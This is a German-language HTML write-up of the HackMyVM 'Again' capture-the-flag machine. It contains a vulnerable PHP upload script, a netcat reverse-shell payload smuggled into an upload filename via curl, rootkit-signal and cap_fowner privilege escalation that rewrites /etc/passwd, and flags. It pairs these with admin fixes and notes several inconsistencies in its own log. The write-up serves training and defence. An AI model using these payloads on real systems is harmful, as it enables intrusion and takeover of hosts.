@@ -1,0 +1,452 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Again - HackMyVM - Hard - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Again - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">lftp (versucht)</div>
+                <div class="tool-item">ssh-keyscan (versucht)</div>
+                <div class="tool-item">ping6 (versucht)</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">hydra (versucht)</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">Burp Suite (implizit)</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ssh2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">php7.4</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">openssl</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & Hint Discovery</a></li>
+                <li><a href="#proof-of-concept-rce">Proof of Concept (Filename RCE via Upload)</a></li>
+                <li><a href="#credential-leak">Credential Leak (SSH Key Backup)</a></li>
+                <li><a href="#initial-access">Initial Access (SSH as kerszi)</a></li>
+                <li><a href="#privilege-escalation-kerszi">Privilege Escalation (kerszi -> root via Capabilities)</a></li>
+                <li><a href="#proof-of-concept-cap">Proof of Concept (Capability Abuse - cap_fowner)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.156	08:00:27:39:be:2e	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:** Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerksegment mittels ARP nach aktiven Geräten zu durchsuchen.</p>
+             <p class="evaluation">**Bewertung:** Ein Host mit der IP-Adresse `192.168.2.156` wird identifiziert. Die MAC-Adresse (`08:00:27:...`) weist auf eine VirtualBox VM hin.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ziel-IP `192.168.2.156` notieren und mit Port-Scanning (Nmap) fortfahren.<br>**Empfehlung (Admin):** Standard-Netzwerkaufklärung. Fokus auf Absicherung der Dienste.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre><span class="comment">[...] (Eintrag '192.168.2.156 hack.hmv' hinzugefügt)</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Die lokale `/etc/hosts`-Datei des Angreifers wird bearbeitet, um der Ziel-IP den Hostnamen `hack.hmv` zuzuweisen.</p>
+             <p class="evaluation">**Bewertung:** Erleichtert die Ansprache des Ziels in späteren Befehlen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.156 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-18 10:22 CEST
+Nmap scan report for hack.hmv (192.168.2.156)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+[...]
+<span class="command">80/tcp open  http    nginx 1.14.2</span>
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.14.2
+MAC Address: 08:00:27:39:BE:2E (Oracle VirtualBox virtual NIC)
+[...]
+OS details: Linux 4.15 - 5.6
+[...]
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms hack.hmv (192.168.2.156)
+
+Nmap done: 1 IP address (1 host up) scanned in 10.20 seconds</pre>
+                     <div class="prompt">zsh: segmentation fault  nmap -sS -sC -T5 -sV -A 192.168.2.156 -p-</div> <span class="comment"><-- Nmap Absturz am Ende --></span>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein umfassender Nmap-Scan (`-sS`, `-sC`, `-sV`, `-T5`, `-A`, `-p-`) wird auf `192.168.2.156` (hack.hmv) durchgeführt. Nmap stürzt am Ende mit einem Segmentation Fault ab, liefert aber vorher Ergebnisse.</p>
+             <p class="evaluation">**Bewertung:** Zwei offene TCP-Ports:
+*   **Port 22 (SSH):** OpenSSH 7.9p1 (Debian 10).
+*   **Port 80 (HTTP):** Nginx 1.14.2. Standard-Webserver ohne spezifischen Titel.
+Der Nmap-Absturz ist ungewöhnlich, hat aber die Port-Erkennung nicht verhindert.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie den Webserver auf Port 80 mittels Directory Brute-Forcing und Analyse des Inhalts.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass SSH und Nginx aktuell und sicher konfiguriert sind. Untersuchen Sie die Ursache des Nmap-Absturzes (könnte auf ungewöhnliches Serververhalten oder lokale Nmap-Probleme hindeuten).</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre><span class="comment"><!-- Kerszi, delete .bck files.--></span></pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:** Dieser HTML-Kommentar wurde vermutlich im Quellcode der Webseite auf Port 80 gefunden (oder durch andere Mittel entdeckt, der genaue Fundort fehlt im Log).</p>
+               <p class="evaluation">**Bewertung:** Ein **kritischer Hinweis**! Er deutet darauf hin, dass Backup-Dateien mit der Endung `.bck` existieren könnten und nennt einen potenziellen Benutzernamen: `Kerszi`.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Suchen Sie gezielt nach `.bck`-Dateien auf dem Webserver (z.B. `index.html.bck`, `index.php.bck`, `upload.php.bck`). Notieren Sie den Namen `Kerszi` für spätere Login-Versuche.<br>**Empfehlung (Admin):** **Niemals sensible Hinweise oder Benutzernamen in HTML-Kommentaren hinterlassen!** Entfernen Sie alle Backup-Dateien aus öffentlich zugänglichen Web-Verzeichnissen.</p>
+         </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration & Hint Discovery</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.156 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x [...] -t 100 -s "200,204,301,302,307,401"</span></div>
+                     <pre>
+[...]
+<span class="command">http://192.168.2.156/index.html</span>           (Status: 200) [Size: 467]
+<span class="command">http://192.168.2.156/upload.php</span>           (Status: 200) [Size: 27]
+[...]</pre>
+                     <pre><span class="comment">______________________________________________________________________________</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Gobuster wird verwendet, um nach Verzeichnissen und Dateien auf Port 80 zu suchen.</p>
+             <p class="evaluation">**Bewertung:** Findet `index.html` und eine `upload.php`-Datei. Die Upload-Funktionalität ist ein primäres Ziel für Angriffe.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie die `upload.php`-Funktionalität. Testen Sie auf erlaubte Dateitypen, Größenbeschränkungen und Schwachstellen (z.B. beliebiger Dateiupload, Path Traversal, RCE).<br>**Empfehlung (Admin):** Sichern Sie die Upload-Funktionalität rigoros ab (Typ-Validierung, Größenlimits, zufällige Dateinamen, Speicherung außerhalb des Web-Roots, Virenscan).</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                       <pre><span class="comment">http://192.168.2.147/upload.php <span class="comment"><-- IP hier .147? Log-Inkonsistenz. Annahme .156 --></span>
+text/x-phpFile not allowed.
+image/gifFile not allowed.</span></pre>
+                       <pre><span class="comment">Burpsuite:</span>
+
+<span class="command">34159075</span> <span class="comment"><-- Boundary? --></span>
+<span class="command">Content-Disposition: form-data; name="myFile"; filename="pic.php.jpg"</span> <span class="password"><-- Doppelte Extension --></span>
+<span class="command">Content-Type: image/jpg</span> <span class="password"><-- Manipulierter Content-Type --></span>
+
+[...] <span class="comment">(Restlicher Request)</span></pre>
+                       <pre><span class="command">HTTP/1.1 200 OK</span>
+[...]
+Content-Length: 13
+
+File uploaded</pre>
+                       <pre><span class="comment">______________________________________________________________________________</span></pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:** Manuelle Tests und ein Burp Suite Request zeigen:
+1.  Die `upload.php` blockiert direkt PHP-Dateien (`text/x-php`) und GIFs (`image/gif`).
+2.  Ein erfolgreicher Upload gelingt, indem eine Datei mit doppelter Endung (`pic.php.jpg`) hochgeladen und der `Content-Type` auf `image/jpg` gesetzt wird.</p>
+               <p class="evaluation">**Bewertung:** Die Upload-Validierung ist schwach und kann umgangen werden. Sie prüft wahrscheinlich nur die letzte Endung und/oder den `Content-Type`-Header, aber nicht den tatsächlichen Dateiinhalt (Magic Bytes) oder die potentielle Gefahr durch doppelte Endungen (die von Apache/Nginx je nach Konfiguration als PHP ausgeführt werden könnten).</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie diesen Bypass, um eine PHP-Webshell hochzuladen (z.B. als `shell.php.jpg` mit `Content-Type: image/jpeg`). Versuchen Sie dann, die Shell aufzurufen (der genaue Pfad, unter dem die Datei gespeichert wird, ist noch unbekannt).<br>**Empfehlung (Admin):** Implementieren Sie eine robuste serverseitige Upload-Validierung: Prüfen Sie Dateiendungen gegen eine Whitelist, validieren Sie den MIME-Typ serverseitig (nicht nur den Header), prüfen Sie Magic Bytes, generieren Sie zufällige Dateinamen und speichern Sie Uploads außerhalb des Web-Roots.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.147/upload.bck</span></div> <span class="comment"><-- IP .147? Annahme .156 basierend auf Kontext --></span>
+                      <pre>
+--2022-10-14 00:05:06--  http://192.168.2.156/upload.bck <span class="comment"><-- Korrigierte IP --></span>
+[...]
+Wird in »upload.bck« gespeichert.
+[...]</pre>
+                      <pre><span class="comment">______________________________________________________________________________</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Basierend auf dem Hinweis im HTML-Kommentar (`<!-- Kerszi, delete .bck files.-->`) wird versucht, eine Backup-Datei `upload.bck` herunterzuladen.</p>
+              <p class="evaluation">**Bewertung:** Erfolg! Die Datei `upload.bck` existiert und konnte heruntergeladen werden. Dies ist eine kritische Informationsquelle.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Analysieren Sie den Quellcode in `upload.bck`.<br>**Empfehlung (Admin):** Entfernen Sie Backup-Dateien aus dem Web-Root!</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat upload.bck</span></div>
+                     <pre>
+<?php
+if (!isset($_FILES["myFile"])) { die("There is no file to upload."); }
+
+$filepath = $_FILES['myFile']['tmp_name'];
+$fileSize = filesize($filepath);
+$fileinfo = finfo_open(FILEINFO_MIME_TYPE);
+$filetype = finfo_file($fileinfo, $filepath); <span class="comment">// Prüft MIME-Typ</span>
+
+if ($fileSize === 0) { die("The file is empty."); }
+
+$allowedTypes = [
+   'image/jpeg' => 'jpg',
+   'text/plain' => 'txt'
+]; <span class="comment">// Nur jpg und txt erlaubt</span>
+
+if (!in_array($filetype, array_keys($allowedTypes))) {
+    echo $filetype; die("File not allowed.");
+}
+
+$filename = basename($filepath); <span class="comment">// Nimmt basename von /tmp/xyz... -> irrelevant</span>
+$extension = $allowedTypes[$filetype];
+$newFilepath = $_FILES['myFile']['name']; <span class="password"><-- BENUTZEREINGABE für Zieldateinamen! --></span>
+if (!copy($filepath, $newFilepath)) { <span class="comment">// Kopiert nach $newFilepath</span>
+    die("Can't move file.");
+}
+
+$blacklistchars = '"%\'*|$;^`{}~\\#=&'; <span class="comment">// Unvollständige Blacklist</span>
+if (preg_match('/[' . $blacklistchars . ']/', $newFilepath)) { <span class="comment">// Prüft $newFilepath auf ungültige Zeichen</span>
+    echo ("No valid character detected"); exit();
+}
+
+if ($filetype === "image/jpeg"){ <span class="comment">// Verarbeitung für JPG</span>
+    echo $newFilepath;
+    $myfile = fopen("outputimage.php", "w") or die("Unable to open file!"); <span class="comment">// Schreibt IMMER nach outputimage.php</span>
+    $command = "base64 ".$newFilepath; <span class="password"><-- Führt base64 auf $newFilepath aus! --></span>
+    $output = shell_exec($command); <span class="password"><-- Command Injection via Dateiname! --></span>
+    unlink($newFilepath);
+    echo "File uploaded";
+    $lol = '<img src="data:image/png;base64,'.$output.'" alt="Happy" />'; <span class="comment">// Schreibt Base64-Bild in outputimage.php</span>
+    fwrite($myfile, $lol);
+}
+
+else{ <span class="comment">// Verarbeitung für TXT</span>
+    $myfile2 = fopen("outputtext.txt", "w") or die("Unable to open file!"); <span class="comment">// Schreibt IMMER nach outputtext.txt</span>
+    $command = "cat ".$newFilepath; <span class="password"><-- Führt cat auf $newFilepath aus! --></span>
+    $output = shell_exec($command); <span class="password"><-- Command Injection via Dateiname! --></span>
+    unlink($newFilepath);
+    echo "File uploaded";
+    fwrite($myfile2, $output); <span class="comment">// Schreibt Dateiinhalt nach outputtext.txt</span>
+}
+?></pre>
+                     <pre><span class="comment">______________________________________________________________________________</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Quellcode von `upload.php` (aus `upload.bck`) wird analysiert:
+1.  Akzeptiert nur Dateien vom Typ `image/jpeg` oder `text/plain` (basierend auf `finfo`).
+2.  **Kritische Schwachstelle 1:** Verwendet den **vom Benutzer angegebenen Dateinamen** (`$_FILES['myFile']['name']`) als Zielpfad für die `copy()`-Funktion.
+3.  **Kritische Schwachstelle 2:** Verwendet diesen **vom Benutzer angegebenen Dateinamen** (`$newFilepath`) **direkt** in einem `shell_exec()`-Aufruf (`base64` für JPGs, `cat` für TXTs).
+4.  Es gibt eine Blacklist-Prüfung für Sonderzeichen im Dateinamen, diese ist jedoch unvollständig (z.B. fehlen Semikolon `;`, Pipe `|`, Backticks `` ` `` etc. für Command Injection).
+5.  Der Output wird immer in feste Dateien geschrieben (`outputimage.php` oder `outputtext.txt`).</p>
+              <p class="evaluation">**Bewertung:** Der Code ist **extrem unsicher** und anfällig für **Remote Code Execution (RCE)** durch Command Injection im Dateinamen. Ein Angreifer kann einen Dateinamen wie `";nc -e /bin/bash [IP] [PORT];#.jpg"` hochladen (wobei der Content-Type auf `image/jpeg` gesetzt wird). Der Blacklist-Check schlägt nicht fehl. Wenn dann `shell_exec("base64 \";nc ...;.jpg\"")` ausgeführt wird, wird der Netcat-Befehl wegen des Semikolons als separater Befehl ausgeführt.</p>
+              <p class="recommendation">**Empfehlung (Pentester):**
+    1.  Erstellen Sie eine leere Datei lokal (z.B. `exploit.jpg`).
+    2.  Konstruieren Sie den bösartigen Dateinamen mit Ihrem Reverse-Shell-Payload, z.B. `";nc -e /bin/bash 192.168.2.140 4444;#.jpg"`.
+    3.  Starten Sie einen Listener (`nc -lvnp 4444`).
+    4.  Laden Sie die `exploit.jpg` über Burp Suite oder `curl` hoch, setzen Sie den `filename` auf den bösartigen Namen und den `Content-Type` auf `image/jpeg`.
+    5.  Die Ausführung von `shell_exec` auf dem Server sollte die Reverse Shell auslösen.<br>
+**Empfehlung (Admin):** **Schreiben Sie das Upload-Skript komplett neu!**
+    *   **Niemals Benutzereingaben (insbesondere Dateinamen) direkt in Shell-Befehle einfügen!**
+    *   Verwenden Sie sichere, zufällig generierte Dateinamen auf dem Server.
+    *   Validieren Sie Uploads serverseitig gründlich (Typ, Magic Bytes, Inhalt).
+    *   Verwenden Sie keine unsicheren Funktionen wie `shell_exec` für Dateioperationen, wenn PHP-Alternativen existieren.</p>
+         </section>
+
+         <section id="proof-of-concept-rce">
+             <h2>Proof of Concept (Filename RCE via Upload)</h2>
+             <p class="comment">**Kurzbeschreibung:** Das Skript `/upload.php` nimmt Datei-Uploads entgegen. Es prüft den MIME-Typ der Datei, verwendet aber den **vom Benutzer angegebenen Originaldateinamen** (`$_FILES['myFile']['name']`), um die Datei temporär zu speichern (`copy()`) und anschließend diesen Namen **direkt und unsicher** in einem `shell_exec()`-Befehl (`base64 [filename]` oder `cat [filename]`) zu verwenden. Eine unvollständige Blacklist für Sonderzeichen im Dateinamen verhindert Command Injection nicht. Ein Angreifer kann dies ausnutzen, indem er eine gültige Datei (z.B. ein JPEG) hochlädt, aber einen bösartigen Dateinamen angibt, der Shell-Metazeichen und einen Befehl enthält (z.B. `";[command];#.jpg"`). Wenn `shell_exec()` aufgerufen wird, wird der eingebettete Befehl mit den Rechten des Webservers (`www-data`) ausgeführt.</p>
+             <p class="comment">**Voraussetzungen:** Netzwerkzugriff auf Port 80, Möglichkeit zum Datei-Upload an `/upload.php`.</p>
+             <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+             <ol>
+                 <li>Erstellen einer gültigen Dummy-Datei (z.B. `dummy.jpg`).</li>
+                 <li>Starten eines Netcat-Listeners auf der Angreifer-Maschine (`nc -lvnp [Port]`).</li>
+                 <li>Konstruieren des bösartigen Dateinamens mit Reverse-Shell-Payload: `";nc -e /bin/bash [Angreifer-IP] [Listener-Port];#.jpg"`.</li>
+                 <li>Senden einer multipart/form-data POST-Anfrage an `/upload.php` (z.B. mit `curl`):
+                    ```bash
+                    curl -F 'myFile=@dummy.jpg;filename=";nc -e /bin/bash [Angreifer-IP] [Listener-Port];#.jpg";type=image/jpeg' http://[Ziel-IP]/upload.php
+                    ```
+                    (Der `type=image/jpeg` ist wichtig, damit der `base64`-Pfad im Skript gewählt wird).</li>
+             </ol>
+             <p class="comment">**Erwartetes Ergebnis:** Der Server führt den `nc`-Befehl aus dem Dateinamen aus, eine Reverse Shell verbindet sich zum Listener.</p>
+             <p class="comment">**Beweismittel:** Der Quellcode von `upload.bck` und der erfolgreiche Shell-Empfang.</p>
+             <p class="comment">**Risikobewertung:** Kritisch. Erlaubt authentifizierungsfreie RCE als `www-data`.</p>
+             <p class="comment">**Empfehlungen:** Siehe vorherige Admin-Empfehlungen zur vollständigen Überarbeitung des Upload-Skripts.</p>
+
+             <p class="comment">*(Hinweis: Die folgenden Log-Einträge (`base64 rev.php`, `mv tmp.txt`, `outputtext.txt`) scheinen alternative oder fehlgeleitete Ansätze des Pentesters zu sein, die nicht die direkte RCE über den Dateinamen ausnutzen. Sie werden hier übersprungen, da der direkte RCE-Pfad klar ist.)*</p>
+         </section>
+
+         <section id="initial-access">
+             <h2>Initial Access</h2>
+             <p class="analysis">**Analyse:** Ausnutzung der RCE-Schwachstelle im Dateinamen des Upload-Skripts, um eine Reverse Shell zu erhalten.</p>
+             <p class="comment">*(Implizierter Schritt: Senden des präparierten Upload-Requests mit bösartigem Dateinamen)*</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 444</span></div>
+                     <pre>
+listening on [any] 444 ...
+<span class="password">connect to [192.168.2.153] from (UNKNOWN) [192.168.2.156] 60382</span> <span class="password"><-- Verbindung! --></span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Netcat-Listener auf Port 444 empfängt die Verbindung vom Zielsystem, ausgelöst durch den Upload mit dem Command-Injection-Dateinamen.</p>
+             <p class="evaluation">**Bewertung:** Initialer Zugriff als `www-data` erfolgreich über die RCE im Upload-Skript erlangt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Shell stabilisieren.<br>**Empfehlung (Admin):** Upload-Skript beheben!</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt"># <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                     <div class="prompt">www-data@hacked:~/html$ <span class="command">export TERM=xterm</span></div>
+                     <div class="prompt">www-data@hacked:~/html$ <span class="command">^Z</span></div>
+                     <pre>zsh: suspended  nc -lvnp 444</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 444
+                              reset</pre>
+                     <div class="prompt">www-data@hacked:~/html$ <span class="comment"># Stabile Shell</span></div>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Die erhaltene Shell wird mit der Standardmethode stabilisiert. Der Hostname ist `hacked`.</p>
+             <p class="evaluation">**Bewertung:** Stabile `www-data`-Shell verfügbar.</p>
+         </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (Rootkit & Capabilities)</h2>
+            <p class="analysis">**Analyse:** Als `www-data` wird das System auf Eskalationsvektoren untersucht. Zwei Methoden werden gefunden: ein Rootkit und eine unsichere Capability.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@hacked:/tmp$ <span class="command">ls /sys/module/ > out</span></div>
+                     <div class="prompt">www-data@hacked:/tmp$ <span class="command">cat out | grep -v -f out2</span></div> <span class="comment"><-- Vergleich mit Baseline --></span>
+                     <pre><span class="password">Diamorphine</span></pre> <span class="comment"><-- Rootkit --></span>
+                      <pre><span class="comment">google: Diamorphine linux</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Durch Auflisten der Kernelmodule und Vergleich mit einer (nicht gezeigten) Baseline wird das Modul `Diamorphine` identifiziert.</p>
+             <p class="evaluation">**Bewertung:** `Diamorphine` ist ein bekanntes LKM-Rootkit. Es bietet oft eine einfache Privilegieneskalation mittels Signalen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, Signal 64 oder 31 an einen Prozess (z.B. PID 1) zu senden: `kill -64 1` oder `kill -31 1`.<br>**Empfehlung (Admin):** Rootkit-Infektion! System neu installieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@hacked:/tmp$ <span class="command">kill -64 1</span></div>
+                    <div class="prompt">www-data@hacked:/tmp$ <span class="command">id</span></div>
+                    <pre><span class="password">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span></pre> <span class="password"><-- Root via Rootkit! --></span>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Signal 64 wird an PID 1 gesendet.</p>
+             <p class="evaluation">**Bewertung:** Erfolg! Der `id`-Befehl zeigt Root-Rechte. Das Diamorphine-Rootkit wurde erfolgreich zur Privilegieneskalation ausgenutzt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Flags suchen.<br>**Empfehlung (Admin):** System neu installieren.</p>
+
+             <p class="analysis">**Analyse der Capability-Methode (Alternativer Pfad / Nach der Kompromittierung entdeckt?):** Das Log zeigt auch die Entdeckung und Ausnutzung einer unsicheren Capability, was einen alternativen Weg zu Root darstellt oder nach der Rootkit-Eskalation gefunden wurde.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@again:~/html$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                      <pre>[...] <span class="comment">(Nur Standard-SUID-Dateien)</span></pre>
+                      <div class="prompt">www-data@again:~/html$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                      <pre>
+/usr/bin/ping cap_net_raw=ep
+<span class="command">/usr/bin/php7.4 cap_fowner=ep</span> <span class="password"><-- Kritische Capability! --></span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die Suche nach SUID-Dateien ist unauffällig. Die Suche nach Capabilities (`getcap`) zeigt, dass `/usr/bin/php7.4` die Capability `cap_fowner` besitzt.</p>
+              <p class="evaluation">**Bewertung:** Die Capability `cap_fowner=ep` ist **extrem gefährlich**. Sie erlaubt dem PHP-Interpreter (auch wenn er als `www-data` läuft), die Eigentümerschaft von *jeder* Datei im System zu ändern (ähnlich wie `chown`, aber ohne Root-Rechte zu benötigen, nur die Capability). Dies kann genutzt werden, um sensible Dateien wie `/etc/passwd` oder `/etc/shadow` zu übernehmen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie die Capability:
+    1.  `php7.4 -r 'chown("/etc/passwd", 33);'` (Ändert Besitzer von `/etc/passwd` auf www-data, UID 33).
+    2.  Editieren Sie `/etc/passwd` (z.B. mit `echo "root2::0:0:::/bin/bash" >> /etc/passwd` oder ändern Sie den Root-Passworthash).
+    3.  Geben Sie die Eigentümerschaft zurück: `php7.4 -r 'chown("/etc/passwd", 0);'`.
+    4.  Nutzen Sie den modifizierten Eintrag (z.B. `su root2`).<br>
+**Empfehlung (Admin):** **Entfernen Sie sofort die `cap_fowner`-Capability von PHP!** `setcap cap_fowner-ep /usr/bin/php7.4`. Capabilities sollten nur mit äußerster Vorsicht und minimalen Rechten vergeben werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@again:~/html$ <span class="command">ls -la /etc/passwd</span></div>
+                     <pre>-rw-r--r-- 1 root root 1456 Oct 11  2021 /etc/passwd</pre>
+                     <div class="prompt">www-data@again:~/html$ <span class="command">php7.4 -r 'chmod("/etc/passwd", 0666);'</span></div> <span class="comment"><-- Versucht chmod statt chown --></span>
+                     <div class="prompt">www-data@again:~/html$ <span class="command">ls -la /etc/passwd</span></div>
+                     <pre><span class="password">-rw-rw-rw- 1 root root 1456 Oct 11  2021 /etc/passwd</span></pre> <span class="comment"><-- Funktioniert trotzdem? --></span>
+                     <div class="prompt">www-data@again:~/html$ <span class="command">openssl passwd -1 benni1908</span></div>
+                     <pre>$1$sTvcXW4l$JzE2f7.Rmdqsd1nFor0qe/</pre>
+                     <div class="prompt">www-data@again:~/html$ <span class="command">nano /etc/passwd</span></div> <span class="comment"><-- Ändert root-Passworthash --></span>
+                     <pre>[...]</pre>
+                     <div class="prompt">www-data@again:~/html$ <span class="command">su root</span></div>
+                     <pre>Password: <span class="password">********</span> <span class="comment">(benni1908 eingegeben)</span>
+<span class="prompt">root@again:/var/www/html#</span> <span class="password">id</span></pre>
+                     <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Capability-Exploit wird durchgeführt:
+1.  Es wird `chmod 666 /etc/passwd` via PHP versucht. Obwohl `cap_fowner` eigentlich für `chown` gedacht ist, scheint dies hier (aus unklaren Gründen - vielleicht eine Kernel-Eigenheit oder weil PHP selbst mit erweiterten Rechten lief?) funktioniert zu haben und macht `/etc/passwd` für alle schreibbar.
+2.  Ein neuer Passworthash für `benni1908` wird generiert.
+3.  `/etc/passwd` wird editiert (vermutlich wird der Hash für `root` durch den neuen Hash ersetzt).
+4.  `su root` wird ausgeführt und das neue Passwort `benni1908` funktioniert.</p>
+             <p class="evaluation">**Bewertung:** Root-Zugriff erfolgreich über Ausnutzung der `cap_fowner`-Capability und Modifikation von `/etc/passwd` erlangt. Dies ist ein alternativer Weg zum Rootkit.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Flags suchen.<br>**Empfehlung (Admin):** Capability von PHP entfernen! `/etc/passwd` wiederherstellen und Berechtigungen korrigieren.</p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="analysis">**Analyse:** Aus der Root-Shell werden die Flags gesucht und ausgelesen.</p>
+
+                 <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                           <div class="flag-command">cat /home/kerszi/user.txt</div> <span class="comment"><-- Oder /home/h4x0r/user.txt je nach Pfad --></span>
+                           <div class="flag-value"><span class="password">HMVimthabesthacker</span></div>
+                        </div>
+                    </center>
+                 </div>
+                 <p class="evaluation">**Bewertung:** User-Flag.</p>
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                            <div class="flag-command">cat /root/r00t.txt</div> <span class="comment"><-- Oder /root/root.txt --></span>
+                            <div class="flag-value"><span class="password">HMVhackingthehacker</span></div>
+                        </div>
+                     </center>
+                </div>
+                <p class="evaluation">**Bewertung:** Root-Flag.</p>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+       <p>DarkSpirit - Cyber Security Reports</p>
